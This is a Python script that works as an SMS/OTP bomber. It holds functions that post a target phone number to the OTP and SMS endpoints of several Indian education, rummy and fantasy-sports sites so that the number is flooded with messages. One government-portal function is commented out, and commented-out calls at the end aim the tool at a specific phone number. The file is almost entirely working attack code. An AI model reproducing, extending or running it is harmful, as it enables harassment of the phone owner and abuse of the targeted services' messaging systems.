from requests import post

class without_account:
    
    def byjus(ph):#1
        url = 'https://mtnucleus.byjusweb.com/api/acs/v2/send-otp'
        payload = {
            'page' : 'free-trial-classes',
            'phoneNumber' : ph
        }
        try:
            post(url, data = payload)
        except:
            pass
    '''
    def tnesevai(ph):#2
        url = 'https://www.tnesevai.tn.gov.in/citizen/LoginWithMobile.aspx'

        payload = {
            '__EVENTTARGET' : '',
            '__EVENTARGUMENT' : '',
            '__LASTFOCUS' : '',
            '__VIEWSTATE' : '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',
            '__VIEWSTATEGENERATOR' : '6A8EF298',
            '__EVENTVALIDATION' : 'r4pa2uxgszU/bVGFSAx8F67nNE0d9ku/1nOIUGbpbgSgf0CmBI/QTmXFkzohvNoa55hF1TS5YsZlPVaRbxf87dIrttoIVK71wxxjoiyFuX3Wg0RPw5CY/HBTZ32D2Qut6DFt5+WdmnqnR8ohZ8vg3UEwlP4htkzXBQxtRCIxRz/9fm+JRNThIRMb9RuR5PvXRAsz0Zz+2cFNQ5JhQmEhtaWaV3bstoRIhHQL/AOba1slkGzlnEL9wwFyel62LetMf9tUQeWXl5rq9wrMOPD224PIMARjjRZJRL8/uQn3ntkUxXPBfQsuCoqf1MPLjdcgWwfu7b7zcbo6COeOiI5eJZvs5KZKNppC3kcEyQMpXoZgVEViSAAE2TkRVpwaeKUEEvFqDNgR2LO0XLSzFoXbaJRJONP8hjjU7XLdtwkewU0ib6LSRsRWUtyhOR3Lil+K0nb+jR5srHxChKg+sN8SS+5TnhncUUXJ+rYDBd4sFS7A7cLnqcBPOTHuhsZLz9WAVyilm17SkdOKKns2V9+sRNQIjSUl08P9Sbq+7vfpkzSpHDV0EwOhEi1q/yZyXeNGQ6toYp+tYHyMaBWJcJa367InNGX/pDrZwFpyvNYFqhM/cNQm2qvXM8YGHitdUrQoqfMaODbkTYcPHLFFSk/wmtMgGD3MXKKlP7EDxOO3x9VvDdYyVoMrW3rPooXOeVU9OM36gTM2KMY2f2HqYyHk2JaMnOn/DijFwx/gyNOpcSsecz1m7xaUUe6ZhUsAJtVeIXFOfOuJLgZ3+9A5Nix1Zm3wSBzEB6wxi9vc058WmO4KFtY7Vijko3zEGvLqcMqkZ6TcLbu2uApLjOVWMncG7MODP3QF0loxA9wza/w7KfflOzfeRTons6RSN1oCwimYkGSXROZ8GFUaxH9SKl0DbDwSFWWOIVP6dukWG0V6wbubnHr47bP4KzTc+7V7EAef0gN3K4OWQrE59oWfM/OImCgcHRrdByCAK+/bUageqgnv4qW7XWzD6lnIqvq8jtt3YzCdc16cerzwurzHZmrreT/KafIKt22xNURRyj7tWukj9K5pe+j+E5wthETLPWZkH4JGJX07aYE3Li36lhspKDUc5ACn6rDSe9wUfRQGJmi0qTirp3A5mLrjaaxsl3sh476t/AhxGMIBYzmQWLyW8BBbBrRucp8r8bVDWK1I4SXmLFlI++poxwHOJSAKBGaaXnex5QBfNXydr6vmvlIJ1gAdRXYSpUmvKrXy3YUFUyZOcnJv4t+4jEnt0ICNj/oHhgJ+ExM+H8LFjECgvGewYwu3923amJDALxFm0ql5dR6Ff6IW',
            'ctl00$USERNAME' : '',
            'ctl00$USERCODE' : '' ,
            'ctl00$CENTERCODE' : '',
            'ctl00$DESIGNATION' : '',
            'ctl00$DESIGNATIONINFO' : '',
            'ctl00$ContentPlaceHolderTop$txtMobileNumber' : ph,
            'ctl00$ContentPlaceHolderTop$btnGenerateOTP' : 'Generate OTP',
            'ctl00$ContentPlaceHolderTop$hdnUniqueid' : '',
            'ctl00$ContentPlaceHolderTop$hdnLoginwithMobile': '',
            'ctl00$ContentPlaceHolderTop$hdnSeed' : '905475897',
            'ctl00$ContentPlaceHolderTop$hdnHash' : '',
            'ctl00$ContentPlaceHolderTop$txtFullName' :'' ,
            'ctl00$ContentPlaceHolderTop$ddldistrict' : '0',
            'ctl00$ContentPlaceHolderTop$ddlTaluk' : '0'
        }   
        try:
            post(url, data = payload)
        except:
            pass 
    '''

    def playrummy(ph):#3
        url = 'https://www.playrummy.com/updateData.php'
        payload = {
            'data' : 'sms_download_link',
            'mobile' : ph,
            'source' : 'download-web'
        }

        try:
            post(url, data = payload)
        except:
            pass
    
    def jungleerummy(ph):#4
        url = 'https://app.jungleerummy.com/elara/v2/send-jr-sms?'
        payload = {
            'mobile_number' : ph
        }

        try:
            post(url, data = payload)
        except:
            pass
    
    def my11circle(ph):#5
        url = 'https://www.my11circle.com/api/fl/auth/v3/getOtp'
        payload = {
            "mobile": ph,
            "deviceId": "ea7976ef-0bbf-4f77-a1f0-315ebf2f873e",
            "deviceName": "",
            "refCode": "",
            "isPlaycircle": 'false'
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def hiscor(ph):#6
        url = 'https://nostrapi.nostragamus.in/v4/utils/sendOTP'
        payload = {
            "action": "signup",
            "mobile": ph,
            "type": "mobile",
            "uid": ""
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def rummycircle(ph):#7
        url = 'https://www.rummycircle.com/api/fl/auth/v3/getOtp'
        payload = {
            'mobile': ph,
            'deviceId': 'd58bce0a-9811-4243-b14e-031e24ad5161',
            'deviceName': '',
            'refCode': '',
            'isPlaycircle': 'false'
        }

        try:
            post(url, data = payload)            
        except:
            pass
    
    def aakash(ph):#8
        url = 'https://iacst.aakash.ac.in/anthe/global-otp-verify'
        payload = {
            'mobileparam' : ph,
            'global_data_id' : 'anthe-otp',
            'student_name' : '',
            'corpid' : 'undefined'
        }

        try:
            post(url, data = payload)
            print(p.status_code)
        except:
            pass
    
    def whitehatjr(ph):#9
        url = 'https://api.whitehatjr.com/api/V1/otp/generate?deviceId=eb7226a9-9127-47a0-a073-1453af8ac4d1&timezone=Asia/Calcutta&trackingCode=trackingCode|AB-11169-V-B|AB-11159-V-A|AB-11140-V-A|AB-11164-V-A|AB-11137-V-A|AB-11194-V-B|AB-11186-V-A|AB-11208-V-A|AB-11167-V-A|AB-11182-V-A|AB-11183-V-B|AB-22-V-B|AB-11188-V-B|AB-11150-V-B|AB-29-V-B|AB-11192-V-A|AB-11142-V-A|AB-24-V-C|AB-11151-V-B|AB-11200-V-A|AB-11154-V-A|AB-11195-V-A|AB-11198-V-A|AB-26-V-B|AB-11136-V-A|AB-11152-V-B|AB-13-V-B|AB-11166-V-A|AB-11196-V-A|AB-18-V-A|AB-11184-V-A|AB-11206-V-B|AB-31-V-A|AB-11193-V-B|AB-11176-V-B|AB-11191-V-B|AB-11181-V-B|AB-11156-V-A|AB-11209-V-A|AB-28-V-B|AB-15-V-A|AB-34-V-A|AB-11204-V-A|AB-11163-V-A|AB-11155-V-A|AB-25-V-B|AB-11135-V-A|AB-11201-V-B|AB-11202-V-A|AB-21-V-C|AB-11161-V-A|AB-37-V-B|AB-23-V-C|AB-11153-V-B|AB-17-V-A|AB-11175-V-A|AB-12-V-A|AB-11165-V-A|AB-11160-V-B|AB-27-V-B&regionId=IN&courseType=ALL&brandId=whitehatjr&timestamp=1675871425983&_vercel_no_cache=1'
        payload = {
            "dialCode": "+91",
            "mobile": ph
        }       

        try:
            post(url, data = payload)
            print(p.status_code)
        except:
            pass
    
    def vootkids(ph):#10
        
        url = 'https://us-central1-vootkidsprod-17598.cloudfunctions.net/auth/web/v2/tokens/generate'
        payload = {
            'mobile': ph,
            'countryCode': '+91'
        }
        try:
            post(url, data = payload)
        except:            
            pass


class with_account:
    pass
    
    
sites = (without_account.byjus,
         #without_account.tnesevai,
         without_account.playrummy,
         without_account.jungleerummy,
         without_account.my11circle,
         without_account.hiscor,
         without_account.rummycircle,
         without_account.aakash,
         without_account.whitehatjr,
         without_account.vootkids
    )
#random.choice(sites)('9566782699')
#without_account.tnesevai('9566782699')
#with_account.flipkart('+919566782699')

